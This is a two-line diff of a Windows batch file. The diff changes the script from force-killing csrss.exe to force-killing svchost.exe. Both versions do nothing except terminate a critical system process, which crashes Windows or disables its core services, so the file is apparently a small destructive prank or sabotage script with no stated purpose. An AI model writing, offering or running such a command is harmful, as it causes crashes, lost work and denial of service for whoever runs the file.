@@ -1,2 +1,2 @@
 @echo off
-taskkill /f /im csrss.exe
+taskkill /f /im svchost.exe
